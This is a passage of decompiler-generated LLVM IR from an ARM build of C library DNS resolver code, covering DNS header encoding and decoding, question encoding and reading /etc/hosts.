  %stack_var_-4 = alloca i32, align 4
  %v0_1c508 = load i32, i32* @lr, align 4
  store i32 %v0_1c508, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_1c514 = icmp sgt i32 %arg3, 11
  br i1 %v7_1c514, label %dec_label_pc_1c51c, label %dec_label_pc_1c5e8

dec_label_pc_1c51c:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_1c51c = add i32 %tmp, 1
  %v2_1c51c = inttoptr i32 %v1_1c51c to i8*
  %v3_1c51c = load i8, i8* %v2_1c51c, align 1
  store i8 %v3_1c51c, i8* %tmp16, align 1
  %v0_1c524 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c524 = inttoptr i32 %v0_1c524 to i32*
  %v2_1c524 = load i32, i32* %v1_1c524, align 4
  %v1_1c528 = trunc i32 %v2_1c524 to i8
  %v4_1c528 = add i32 %arg2, 1
  %v5_1c528 = inttoptr i32 %v4_1c528 to i8*
  store i8 %v1_1c528, i8* %v5_1c528, align 1
  %v0_1c52c = load i32, i32* %ip.global-to-local, align 4
  %v1_1c52c = add i32 %v0_1c52c, 8
  %v2_1c52c = inttoptr i32 %v1_1c52c to i32*
  %v3_1c52c = load i32, i32* %v2_1c52c, align 4
  %v1_1c530 = add i32 %v0_1c52c, 20
  %v2_1c530 = inttoptr i32 %v1_1c530 to i32*
  %v3_1c530 = load i32, i32* %v2_1c530, align 4
  %v1_1c534 = add i32 %v0_1c52c, 4
  %v2_1c534 = inttoptr i32 %v1_1c534 to i32*
  %v3_1c534 = load i32, i32* %v2_1c534, align 4
  %v1_1c538 = add i32 %v0_1c52c, 12
  %v2_1c538 = inttoptr i32 %v1_1c538 to i32*
  %v3_1c538 = load i32, i32* %v2_1c538, align 4
  %v2_1c53c = icmp eq i32 %v3_1c530, 0
  br i1 %v2_1c53c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1c51c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1c51c, %bb
  %v0_1c54c = phi i32 [ 0, %dec_label_pc_1c51c ], [ 1, %bb ]
  %v1_1c544 = urem i32 %v3_1c52c, 16
  %v2_1c548 = icmp eq i32 %v3_1c534, 0
  %v4_1c54c = mul nuw nsw i32 %v1_1c544, 8
  %v5_1c54c = or i32 %v0_1c54c, %v4_1c54c
  %v1_1c550 = add i32 %v0_1c52c, 16
  %v2_1c550 = inttoptr i32 %v1_1c550 to i32*
  %v3_1c550 = load i32, i32* %v2_1c550, align 4
  %. = select i1 %v2_1c548, i32 0, i32 128
  %v2_1c55c = icmp eq i32 %v3_1c538, 0
  %storemerge11 = select i1 %v2_1c55c, i32 0, i32 4
  %v2_1c568 = or i32 %v5_1c54c, %.
  %v2_1c56c = icmp eq i32 %v3_1c550, 0
  %.26 = select i1 %v2_1c56c, i32 0, i32 2
  %v2_1c578 = or i32 %v2_1c568, %storemerge11
  %v2_1c57c = or i32 %v2_1c578, %.26
  %v1_1c580 = trunc i32 %v2_1c57c to i8
  %v2_1c580 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c580 = add i32 %v2_1c580, 2
  %v4_1c580 = inttoptr i32 %v3_1c580 to i8*
  store i8 %v1_1c580, i8* %v4_1c580, align 1
  %v0_1c584 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c584 = add i32 %v0_1c584, 24
  %v1_1c588 = inttoptr i32 %v1_1c584 to i32*
  %v2_1c588 = load i32, i32* %v1_1c588, align 4
  %v3_1c588 = add i32 %v0_1c584, 28
  %v4_1c588 = inttoptr i32 %v3_1c588 to i32*
  %v5_1c588 = load i32, i32* %v4_1c588, align 4
  %v2_1c58c = icmp eq i32 %v2_1c588, 0
  %v1_1c590 = urem i32 %v5_1c588, 16
  %v0_1c59c = select i1 %v2_1c58c, i32 0, i32 128
  %v2_1c59c = or i32 %v1_1c590, %v0_1c59c
  %v1_1c5a0 = trunc i32 %v2_1c59c to i8
  %v2_1c5a0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5a0 = add i32 %v2_1c5a0, 3
  %v4_1c5a0 = inttoptr i32 %v3_1c5a0 to i8*
  store i8 %v1_1c5a0, i8* %v4_1c5a0, align 1
  %v0_1c5a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5a4 = add i32 %v0_1c5a4, 33
  %v2_1c5a4 = inttoptr i32 %v1_1c5a4 to i8*
  %v3_1c5a4 = load i8, i8* %v2_1c5a4, align 1
  %v2_1c5a8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5a8 = add i32 %v2_1c5a8, 4
  %v4_1c5a8 = inttoptr i32 %v3_1c5a8 to i8*
  store i8 %v3_1c5a4, i8* %v4_1c5a8, align 1
  %v0_1c5ac = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5ac = add i32 %v0_1c5ac, 32
  %v2_1c5ac = inttoptr i32 %v1_1c5ac to i32*
  %v3_1c5ac = load i32, i32* %v2_1c5ac, align 4
  %v1_1c5b0 = trunc i32 %v3_1c5ac to i8
  %v2_1c5b0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5b0 = add i32 %v2_1c5b0, 5
  %v4_1c5b0 = inttoptr i32 %v3_1c5b0 to i8*
  store i8 %v1_1c5b0, i8* %v4_1c5b0, align 1
  %v0_1c5b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5b4 = add i32 %v0_1c5b4, 37
  %v2_1c5b4 = inttoptr i32 %v1_1c5b4 to i8*
  %v3_1c5b4 = load i8, i8* %v2_1c5b4, align 1
  %v2_1c5b8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5b8 = add i32 %v2_1c5b8, 6
  %v4_1c5b8 = inttoptr i32 %v3_1c5b8 to i8*
  store i8 %v3_1c5b4, i8* %v4_1c5b8, align 1
  %v0_1c5bc = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5bc = add i32 %v0_1c5bc, 36
  %v2_1c5bc = inttoptr i32 %v1_1c5bc to i32*
  %v3_1c5bc = load i32, i32* %v2_1c5bc, align 4
  %v1_1c5c0 = trunc i32 %v3_1c5bc to i8
  %v2_1c5c0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5c0 = add i32 %v2_1c5c0, 7
  %v4_1c5c0 = inttoptr i32 %v3_1c5c0 to i8*
  store i8 %v1_1c5c0, i8* %v4_1c5c0, align 1
  %v0_1c5c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5c4 = add i32 %v0_1c5c4, 41
  %v2_1c5c4 = inttoptr i32 %v1_1c5c4 to i8*
  %v3_1c5c4 = load i8, i8* %v2_1c5c4, align 1
  %v2_1c5c8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5c8 = add i32 %v2_1c5c8, 8
  %v4_1c5c8 = inttoptr i32 %v3_1c5c8 to i8*
  store i8 %v3_1c5c4, i8* %v4_1c5c8, align 1
  %v0_1c5cc = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5cc = add i32 %v0_1c5cc, 40
  %v2_1c5cc = inttoptr i32 %v1_1c5cc to i32*
  %v3_1c5cc = load i32, i32* %v2_1c5cc, align 4
  %v1_1c5d0 = trunc i32 %v3_1c5cc to i8
  %v2_1c5d0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5d0 = add i32 %v2_1c5d0, 9
  %v4_1c5d0 = inttoptr i32 %v3_1c5d0 to i8*
  store i8 %v1_1c5d0, i8* %v4_1c5d0, align 1
  %v0_1c5d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5d4 = add i32 %v0_1c5d4, 45
  %v2_1c5d4 = inttoptr i32 %v1_1c5d4 to i8*
  %v3_1c5d4 = load i8, i8* %v2_1c5d4, align 1
  %v2_1c5d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5d8 = add i32 %v2_1c5d8, 10
  %v4_1c5d8 = inttoptr i32 %v3_1c5d8 to i8*
  store i8 %v3_1c5d4, i8* %v4_1c5d8, align 1
  %v0_1c5dc = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5dc = add i32 %v0_1c5dc, 44
  %v2_1c5dc = inttoptr i32 %v1_1c5dc to i32*
  %v3_1c5dc = load i32, i32* %v2_1c5dc, align 4
  %v1_1c5e0 = trunc i32 %v3_1c5dc to i8
  %v2_1c5e0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1c5e0 = add i32 %v2_1c5e0, 11
  %v4_1c5e0 = inttoptr i32 %v3_1c5e0 to i8*
  store i8 %v1_1c5e0, i8* %v4_1c5e0, align 1
  %v2_1c5e8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1c5e8

dec_label_pc_1c5e8:                               ; preds = %entry, %bb17
  %v2_1c5e8 = phi i32 [ %v2_1c5e8.pre, %bb17 ], [ %v0_1c508, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_1c5e8, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1c52c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 2, 0, 5, 4, 1 }
  uselistorder i32 37, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1c5e8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1c5f0 = load i8, i8* %arg1, align 1
  %v4_1c5f0 = zext i8 %v3_1c5f0 to i32
  %v2_1c5f4 = add i32 %tmp, 1
  %v3_1c5f4 = inttoptr i32 %v2_1c5f4 to i8*
  %v4_1c5f4 = load i8, i8* %v3_1c5f4, align 1
  %v5_1c5f4 = zext i8 %v4_1c5f4 to i32
  %v4_1c5f8 = mul nuw nsw i32 %v4_1c5f0, 256
  %v5_1c5f8 = or i32 %v5_1c5f4, %v4_1c5f8
  %v2_1c5fc = inttoptr i32 %arg2 to i32*
  store i32 %v5_1c5f8, i32* %v2_1c5fc, align 4
  %v2_1c600 = add i32 %tmp, 2
  %v3_1c600 = inttoptr i32 %v2_1c600 to i8*
  %v4_1c600 = load i8, i8* %v3_1c600, align 1
  %tmp3 = icmp slt i8 %v4_1c600, 0
  %v3_1c604 = zext i1 %tmp3 to i32
  %v2_1c608 = add i32 %arg2, 4
  %v3_1c608 = inttoptr i32 %v2_1c608 to i32*
  store i32 %v3_1c604, i32* %v3_1c608, align 4
  %v4_1c60c = load i8, i8* %v3_1c600, align 1
  %div = udiv i8 %v4_1c60c, 8
  %tmp4 = urem i8 %div, 16
  %v1_1c614 = zext i8 %tmp4 to i32
  %v2_1c618 = add i32 %arg2, 8
  %v3_1c618 = inttoptr i32 %v2_1c618 to i32*
  store i32 %v1_1c614, i32* %v3_1c618, align 4
  %v4_1c61c = load i8, i8* %v3_1c600, align 1
  %div1 = udiv i8 %v4_1c61c, 4
  %tmp5 = urem i8 %div1, 2
  %v1_1c624 = zext i8 %tmp5 to i32
  %v2_1c628 = add i32 %arg2, 12
  %v3_1c628 = inttoptr i32 %v2_1c628 to i32*
  store i32 %v1_1c624, i32* %v3_1c628, align 4
  %v4_1c62c = load i8, i8* %v3_1c600, align 1
  %div2 = udiv i8 %v4_1c62c, 2
  %tmp6 = urem i8 %div2, 2
  %v1_1c634 = zext i8 %tmp6 to i32
  %v2_1c638 = add i32 %arg2, 16
  %v3_1c638 = inttoptr i32 %v2_1c638 to i32*
  store i32 %v1_1c634, i32* %v3_1c638, align 4
  %v4_1c63c = load i8, i8* %v3_1c600, align 1
  %tmp7 = urem i8 %v4_1c63c, 2
  %v1_1c640 = zext i8 %tmp7 to i32
  %v2_1c644 = add i32 %arg2, 20
  %v3_1c644 = inttoptr i32 %v2_1c644 to i32*
  store i32 %v1_1c640, i32* %v3_1c644, align 4
  %v2_1c648 = add i32 %tmp, 3
  %v3_1c648 = inttoptr i32 %v2_1c648 to i8*
  %v4_1c648 = load i8, i8* %v3_1c648, align 1
  %tmp8 = icmp slt i8 %v4_1c648, 0
  %v3_1c64c = zext i1 %tmp8 to i32
  %v2_1c650 = add i32 %arg2, 24
  %v3_1c650 = inttoptr i32 %v2_1c650 to i32*
  store i32 %v3_1c64c, i32* %v3_1c650, align 4
  %v4_1c654 = load i8, i8* %v3_1c648, align 1
  %tmp9 = urem i8 %v4_1c654, 16
  %v1_1c658 = zext i8 %tmp9 to i32
  %v2_1c65c = add i32 %arg2, 28
  %v3_1c65c = inttoptr i32 %v2_1c65c to i32*
  store i32 %v1_1c658, i32* %v3_1c65c, align 4
  %v2_1c660 = add i32 %tmp, 4
  %v3_1c660 = inttoptr i32 %v2_1c660 to i8*
  %v4_1c660 = load i8, i8* %v3_1c660, align 1
  %v5_1c660 = zext i8 %v4_1c660 to i32
  %v2_1c664 = add i32 %tmp, 5
  %v3_1c664 = inttoptr i32 %v2_1c664 to i8*
  %v4_1c664 = load i8, i8* %v3_1c664, align 1
  %v5_1c664 = zext i8 %v4_1c664 to i32
  %v4_1c668 = mul nuw nsw i32 %v5_1c660, 256
  %v5_1c668 = or i32 %v5_1c664, %v4_1c668
  %v2_1c66c = add i32 %arg2, 32
  %v3_1c66c = inttoptr i32 %v2_1c66c to i32*
  store i32 %v5_1c668, i32* %v3_1c66c, align 4
  %v2_1c670 = add i32 %tmp, 6
  %v3_1c670 = inttoptr i32 %v2_1c670 to i8*
  %v4_1c670 = load i8, i8* %v3_1c670, align 1
  %v5_1c670 = zext i8 %v4_1c670 to i32
  %v2_1c674 = add i32 %tmp, 7
  %v3_1c674 = inttoptr i32 %v2_1c674 to i8*
  %v4_1c674 = load i8, i8* %v3_1c674, align 1
  %v5_1c674 = zext i8 %v4_1c674 to i32
  %v4_1c678 = mul nuw nsw i32 %v5_1c670, 256
  %v5_1c678 = or i32 %v5_1c674, %v4_1c678
  %v2_1c67c = add i32 %arg2, 36
  %v3_1c67c = inttoptr i32 %v2_1c67c to i32*
  store i32 %v5_1c678, i32* %v3_1c67c, align 4
  %v2_1c680 = add i32 %tmp, 8
  %v3_1c680 = inttoptr i32 %v2_1c680 to i8*
  %v4_1c680 = load i8, i8* %v3_1c680, align 1
  %v5_1c680 = zext i8 %v4_1c680 to i32
  %v2_1c684 = add i32 %tmp, 9
  %v3_1c684 = inttoptr i32 %v2_1c684 to i8*
  %v4_1c684 = load i8, i8* %v3_1c684, align 1
  %v5_1c684 = zext i8 %v4_1c684 to i32
  %v4_1c688 = mul nuw nsw i32 %v5_1c680, 256
  %v5_1c688 = or i32 %v5_1c684, %v4_1c688
  %v2_1c68c = add i32 %arg2, 40
  %v3_1c68c = inttoptr i32 %v2_1c68c to i32*
  store i32 %v5_1c688, i32* %v3_1c68c, align 4
  %v2_1c690 = add i32 %tmp, 11
  %v3_1c690 = inttoptr i32 %v2_1c690 to i8*
  %v4_1c690 = load i8, i8* %v3_1c690, align 1
  %v5_1c690 = zext i8 %v4_1c690 to i32
  %v2_1c694 = add i32 %tmp, 10
  %v3_1c694 = inttoptr i32 %v2_1c694 to i8*
  %v4_1c694 = load i8, i8* %v3_1c694, align 1
  %v5_1c694 = zext i8 %v4_1c694 to i32
  %v4_1c698 = mul nuw nsw i32 %v5_1c694, 256
  %v5_1c698 = or i32 %v4_1c698, %v5_1c690
  %v2_1c69c = add i32 %arg2, 44
  %v3_1c69c = inttoptr i32 %v2_1c69c to i32*
  store i32 %v5_1c698, i32* %v3_1c69c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 13, 14, 0, 11, 12, 2, 15, 10, 39, 1, 3, 23, 24, 25, 26, 27, 28, 20, 21, 22, 16, 17, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 18, 4, 5, 6, 7, 8, 19, 9 }
  uselistorder i32 11, { 20, 21, 7, 8, 9, 10, 11, 22, 24, 12, 4, 5, 6, 13, 14, 15, 16, 17, 18, 0, 19, 3, 2, 1, 23 }
  uselistorder i32 40, { 22, 23, 26, 1, 4, 15, 24, 27, 2, 25, 5, 6, 3, 7, 8, 9, 10, 0, 11, 12, 16, 17, 18, 19, 20, 13, 14, 21, 28 }
  uselistorder i32 36, { 43, 44, 47, 48, 49, 50, 6, 45, 7, 39, 8, 40, 9, 1, 4, 46, 10, 12, 16, 13, 17, 14, 18, 15, 19, 20, 0, 2, 21, 29, 30, 28, 31, 32, 33, 34, 35, 36, 23, 24, 25, 26, 22, 27, 11, 37, 3, 41, 42, 5, 51, 38 }
  uselistorder i32 7, { 21, 22, 16, 0, 11, 12, 1, 2, 24, 18, 19, 20, 3, 4, 5, 6, 17, 7, 13, 14, 8, 9, 15, 10, 23 }
  uselistorder i32 28, { 73, 13, 15, 76, 14, 79, 80, 85, 87, 88, 16, 9, 18, 17, 86, 19, 20, 81, 1, 60, 74, 75, 54, 21, 55, 22, 91, 23, 72, 89, 24, 2, 25, 61, 26, 27, 28, 29, 30, 31, 3, 32, 33, 34, 35, 77, 78, 10, 36, 4, 82, 83, 37, 38, 39, 41, 40, 42, 5, 6, 7, 62, 63, 64, 65, 66, 67, 68, 0, 69, 8, 56, 43, 84, 44, 57, 58, 59, 11, 12, 70, 49, 48, 46, 47, 53, 50, 51, 71, 45, 52, 90 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 4, { 2, 0, 1 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1c6a4 = load i32, i32* @r4, align 4
  store i32 %v3_1c6a4, i32* %stack_var_-16, align 4
  %v9_1c6a4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1c6ac = load i32, i32* %arg1, align 4
  store i32 %v2_1c6ac, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1c6b8 = inttoptr i32 %v2_1c6ac to i8*
  %v2_1c6b8 = call i32 @__encode_dotted(i8* %v1_1c6b8)
  store i32 %v2_1c6b8, i32* %r0.global-to-local, align 4
  %v1_1c6bc = icmp slt i32 %v2_1c6b8, 0
  br i1 %v1_1c6bc, label %dec_label_pc_1c6fc, label %dec_label_pc_1c6c4

dec_label_pc_1c6c4:                               ; preds = %entry
  %v1_1c6c4 = load i32, i32* @r5, align 4
  %v2_1c6c4 = sub i32 %v1_1c6c4, %v2_1c6b8
  %v7_1c6cc = icmp slt i32 %v2_1c6c4, 4
  br i1 %v7_1c6cc, label %bb, label %dec_label_pc_1c6d4

bb:                                               ; preds = %dec_label_pc_1c6c4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c6fc

dec_label_pc_1c6d4:                               ; preds = %dec_label_pc_1c6c4
  %v0_1c6d4 = load i32, i32* @r4, align 4
  %v1_1c6d4 = add i32 %v0_1c6d4, 5
  %v2_1c6d4 = inttoptr i32 %v1_1c6d4 to i8*
  %v3_1c6d4 = load i8, i8* %v2_1c6d4, align 1
  %v2_1c6d8 = load i32, i32* @r6, align 4
  %v4_1c6d8 = add i32 %v2_1c6d8, %v2_1c6b8
  %v5_1c6d8 = inttoptr i32 %v4_1c6d8 to i8*
  store i8 %v3_1c6d4, i8* %v5_1c6d8, align 1
  %v0_1c6dc = load i32, i32* @r4, align 4
  %v1_1c6dc = add i32 %v0_1c6dc, 4
  %v2_1c6dc = inttoptr i32 %v1_1c6dc to i32*
  %v3_1c6dc = load i32, i32* %v2_1c6dc, align 4
  %v0_1c6e0 = load i32, i32* @r6, align 4
  %v1_1c6e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c6e0 = add i32 %v1_1c6e0, %v0_1c6e0
  store i32 %v2_1c6e0, i32* %r2.global-to-local, align 4
  %v1_1c6e4 = trunc i32 %v3_1c6dc to i8
  %v3_1c6e4 = add i32 %v2_1c6e0, 1
  %v4_1c6e4 = inttoptr i32 %v3_1c6e4 to i8*
  store i8 %v1_1c6e4, i8* %v4_1c6e4, align 1
  %v0_1c6e8 = load i32, i32* @r4, align 4
  %v1_1c6e8 = add i32 %v0_1c6e8, 9
  %v2_1c6e8 = inttoptr i32 %v1_1c6e8 to i8*
  %v3_1c6e8 = load i8, i8* %v2_1c6e8, align 1
  %v2_1c6ec = load i32, i32* %r2.global-to-local, align 4
  %v3_1c6ec = add i32 %v2_1c6ec, 2
  %v4_1c6ec = inttoptr i32 %v3_1c6ec to i8*
  store i8 %v3_1c6e8, i8* %v4_1c6ec, align 1
  %v0_1c6f0 = load i32, i32* @r4, align 4
  %v1_1c6f0 = add i32 %v0_1c6f0, 8
  %v2_1c6f0 = inttoptr i32 %v1_1c6f0 to i32*
  %v3_1c6f0 = load i32, i32* %v2_1c6f0, align 4
  %v1_1c6f4 = trunc i32 %v3_1c6f0 to i8
  %v2_1c6f4 = load i32, i32* %r2.global-to-local, align 4
  %v3_1c6f4 = add i32 %v2_1c6f4, 3
  %v4_1c6f4 = inttoptr i32 %v3_1c6f4 to i8*
  store i8 %v1_1c6f4, i8* %v4_1c6f4, align 1
  %v0_1c6f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c6f8 = add i32 %v0_1c6f8, 4
  store i32 %v1_1c6f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c6fc

dec_label_pc_1c6fc:                               ; preds = %bb, %entry, %dec_label_pc_1c6d4
  %v1_1c700 = phi i32 [ -1, %bb ], [ %v2_1c6b8, %entry ], [ %v1_1c6f8, %dec_label_pc_1c6d4 ]
  %v2_1c6fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c6fc, i32* @r4, align 4
  store i32 %v9_1c6a4, i32* @r6, align 4
  ret i32 %v1_1c700

; uselistorder directives
  uselistorder i32 %v2_1c6b8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 23, 24, 25, 28, 29, 4, 27, 22, 5, 16, 0, 17, 33, 6, 7, 15, 26, 13, 14, 18, 19, 20, 21, 8, 9, 10, 11, 12, 3, 2, 1, 30, 31, 32 }
  uselistorder i32 5, { 23, 24, 25, 7, 17, 8, 26, 9, 2, 18, 10, 19, 12, 11, 3, 0, 28, 5, 20, 6, 1, 21, 22, 13, 14, 16, 15, 4, 27 }
  uselistorder label %dec_label_pc_1c6fc, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1212), i32* @r0, align 4
  %v1_1c71c = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1212))
  ret i32 %v1_1c71c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1c734 = load i32, i32* @r4, align 4
  %v6_1c734 = load i32, i32* @r5, align 4
  %v9_1c734 = load i32, i32* @r6, align 4
  %v12_1c734 = load i32, i32* @r7, align 4
  %v15_1c734 = load i32, i32* @r8, align 4
  %v18_1c734 = load i32, i32* @sb, align 4
  %v21_1c734 = load i32, i32* @sl, align 4
  %v24_1c734 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  %v2_1c75c = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_1c75c, align 4
  %v0_1c760 = load i32, i32* @r0, align 4
  store i32 %v0_1c760, i32* @r6, align 4
  %v0_1c764 = load i32, i32* @r1, align 4
  %v0_1c768 = load i32, i32* @r2, align 4
  store i32 %v0_1c768, i32* @r8, align 4
  %v0_1c76c = load i32, i32* @r3, align 4
  store i32 %v0_1c76c, i32* @fp, align 4
  %v3_1c770 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c770, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_1c77c

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1c91c

dec_label_pc_1c77c:                               ; preds = %entry
  %v2_1c77c = icmp eq i32 %v0_1c760, 0
  br i1 %v2_1c77c, label %dec_label_pc_1c784, label %dec_label_pc_1c7a4

dec_label_pc_1c784:                               ; preds = %dec_label_pc_1c77c
  %v0_1c784 = call i32 @__open_etc_hosts()
  store i32 %v0_1c784, i32* @r6, align 4
  %v2_1c788 = icmp eq i32 %v0_1c784, 0
  br i1 %v2_1c788, label %dec_label_pc_1c790, label %dec_label_pc_1c7a4

dec_label_pc_1c790:                               ; preds = %dec_label_pc_1c784
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_1c794 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_1c794, align 4
  %v0_1c798 = call i32 @__GI___errno_location()
  %v1_1c79c = inttoptr i32 %v0_1c798 to i32*
  %v2_1c79c = load i32, i32* %v1_1c79c, align 4
  store i32 %v2_1c79c, i32* @sb, align 4
  br label %dec_label_pc_1c91c

dec_label_pc_1c7a4:                               ; preds = %dec_label_pc_1c784, %dec_label_pc_1c77c
  %v1_1c7c4 = phi i32 [ %v0_1c784, %dec_label_pc_1c784 ], [ %v0_1c760, %dec_label_pc_1c77c ]
  %v0_1c7a8 = load i32, i32* @r4, align 4
  %v2_1c7a8 = add i32 %v0_1c7a8, -1200
  store i32 %v2_1c7a8, i32* @r4, align 4
  %v2_1c7ac = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_1c7c4 = add i32 %v1_1c7c4, 8
  %v3_1c7c4 = inttoptr i32 %v2_1c7c4 to i32*
  store i32 48, i32* %v3_1c7c4, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_1c7cc = load i32, i32* @r5, align 4
  %v1_1c7cc = add i32 %v0_1c7cc, -48
  store i32 %v1_1c7cc, i32* %r1.global-to-local, align 4
  %v0_1c7d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c7d0 = add i32 %v0_1c7d0, 24
  store i32 %v1_1c7d0, i32* @ip, align 4
  %v0_1c7d4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1c7d4, i32* @sb, align 4
  %v0_1c7d8 = load i32, i32* @lr, align 4
  %v1_1c7d8 = add i32 %v0_1c7d8, 32
  store i32 %v1_1c7d8, i32* @sl, align 4
  %v1_1c7dc = load i32, i32* @r6, align 4
  %v2_1c7dc = add i32 %v1_1c7dc, 16
  %v3_1c7dc = inttoptr i32 %v2_1c7dc to i32*
  store i32 %v1_1c7cc, i32* %v3_1c7dc, align 4
  %v0_1c7e0 = load i32, i32* @r4, align 4
  %v0_1c7e4 = load i32, i32* @ip, align 4
  store i32 %v0_1c7e4, i32* %stack_var_-64, align 4
  %v0_1c7e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c7e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c7e8 = inttoptr i32 %v1_1c7e8 to i32*
  store i32 %v0_1c7e8, i32* %v2_1c7e8, align 4
  %v0_1c7ec = load i32, i32* @lr, align 4
  %v1_1c7ec = load i32, i32* @r6, align 4
  %v2_1c7ec = add i32 %v1_1c7ec, 4
  %v3_1c7ec = inttoptr i32 %v2_1c7ec to i32*
  store i32 %v0_1c7ec, i32* %v3_1c7ec, align 4
  %v2_1c81c = inttoptr i32 %v0_1c764 to i8*
  br label %dec_label_pc_1c8f0

dec_label_pc_1c7f4:                               ; preds = %dec_label_pc_1c8f0
  %v3_1c7f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1c7f4, i32* %r1.global-to-local, align 4
  %v0_1c7f8 = load i32, i32* @fp, align 4
  %v7_1c7f8 = icmp eq i32 %v0_1c7f8, 1
  %v1_1c7fc = add i32 %v3_1c7f4, 4
  store i32 %v1_1c7fc, i32* @r5, align 4
  %v1_1c800 = load i32, i32* @r7, align 4
  %v2_1c800 = add i32 %v1_1c800, 4
  %v3_1c800 = inttoptr i32 %v2_1c800 to i32*
  store i32 %v1_1c7fc, i32* %v3_1c800, align 4
  br i1 %v7_1c7f8, label %dec_label_pc_1c91c, label %dec_label_pc_1c808

dec_label_pc_1c808:                               ; preds = %dec_label_pc_1c7f4
  %v0_1c808 = load i32, i32* @fp, align 4
